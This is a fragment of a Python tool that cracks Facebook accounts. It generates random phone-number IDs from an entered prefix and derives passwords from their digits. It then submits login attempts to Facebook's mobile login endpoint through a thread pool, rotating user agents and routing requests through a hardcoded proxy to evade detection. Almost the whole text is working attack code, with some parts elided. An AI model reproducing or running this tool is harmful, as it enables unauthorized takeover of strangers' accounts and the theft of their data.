...
#ugen=["Mozilla/5.0 (Linux; Android 13; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36"]
#ugen =open("/sdcard/nua.txt","r").read().splitlines()

ugen=["Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Trident/7.0; EzRun1.0.0.3; rv:11.0) like Gecko","Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.94","Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18","Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaC6-01/011.010; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.2 3gpp-gba"]
proxy={'http': 'http://103.41.105.59:80', 'https': 'https://103.41.105.59:80'}
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
...
try:
    ...
    pass
#sock=open('/sdcard/a.txt','r').read().splitlines()
"""def uaku():
        ua=open('/sdcard/a.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)"""
loop = 0
cps = []
...
def Random():
    ...
    print(f"")
    print(' 017,019,018,016,014,013,015')
    print(f"")
    linex()
    code = input(' PUT CODE : ')
    pslen=int(input("Password length:"))
    os.system("clear")
    print(logo)
    print(f"")
    ...
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(11-len(code)))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:    
        ...
        for love in user:
            uid = code+love
            pwx = [uid[(11-n):] for n in range(6,pslen+1)]
            print(uid,pwx)
...
def free(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'user-agent':pro}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb,
            proxies=proxy
            ).text
